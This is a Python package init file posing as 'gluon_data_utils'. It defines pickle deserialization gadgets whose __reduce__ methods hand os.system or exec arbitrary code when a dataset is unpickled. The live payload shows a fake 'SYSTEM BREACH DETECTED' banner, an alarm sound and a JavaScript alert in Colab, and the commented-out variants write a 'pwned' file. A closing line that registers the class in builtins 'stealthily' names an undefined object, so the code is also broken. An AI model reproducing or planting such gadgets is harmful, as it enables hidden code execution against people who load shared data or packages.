# gluon_data_utils/__init__.py
import builtins
import os
from IPython.display import display, HTML

# class Exploit:
#     def __reduce__(self):
#         return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))


# class Exploit:
#     def __reduce__(self):
#         payload = (
#             "from IPython.display import display, HTML\n"
#             "display(HTML(\"\"\"\n"
#             "<div style='background:red;color:white;"
#             "font-size:20px;text-align:center;padding:10px;border:3px solid black;'>"
#             "⚠️ HACKED BY GLUONBOT ⚠️</div>\n"
#             "\"\"\"))"
#         )
#         return (exec, (payload,))



class RCE:
    def __reduce__(self):
        STRING = """
from IPython.display import display, HTML, Javascript

# Animated banner
display(HTML(\"\"\"
<div id='alertbox' style='
    background: linear-gradient(45deg, red, black);
    color: white;
    font-size: 24px;
    text-align: center;
    padding: 20px;
    border: 4px solid white;
    animation: pulse 1s infinite;
'>
    ⚠️ SYSTEM BREACH DETECTED ⚠️
</div>
<style>
@keyframes pulse {
    0% {transform: scale(1);}
    50% {transform: scale(1.05);}
    100% {transform: scale(1);}
}
</style>
<audio autoplay>
    <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
</audio>
\"\"\"))

# JS alert
display(Javascript("alert('⚠️ WARNING: Exploit triggered in Colab!');"))
"""
        return (exec, (STRING,))






# Register in builtins stealthily
builtins.RCE = REC

